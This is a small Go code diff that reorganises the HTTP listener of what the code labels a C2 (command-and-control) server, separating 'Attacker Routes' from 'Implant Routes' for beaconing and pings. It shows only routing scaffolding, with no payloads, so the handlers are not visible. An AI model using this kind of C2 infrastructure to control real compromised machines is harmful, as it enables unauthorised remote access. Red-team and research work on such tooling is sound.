@@ -9,14 +9,16 @@ import (
 )
 
 func HttpInit(port string) {
-	fmt.Printf("[*HTTP] - C2 server listening on port %s...\n", port)
+	fmt.Printf("[*] - HTTP C2 server listening on port %s...\n", port)
 
-	var serverPort string = fmt.Sprintf(":%s", port)
-
-	/* Routes */
+	/* Attacker Routes */
 	http.HandleFunc("/command/ping", handlers.PingC2)
-	http.HandleFunc("/beacon", handlers.Beacon)
 
-	/* Run server */
+	/* Implant Routes */
+	http.HandleFunc("/beacon", handlers.Beacon)
+	http.HandleFunc("/ping", handlers.Ping)
+
+	// Run server
+	var serverPort string = fmt.Sprintf(":%s", port)
 	log.Fatal(http.ListenAndServe(serverPort, nil))
 }
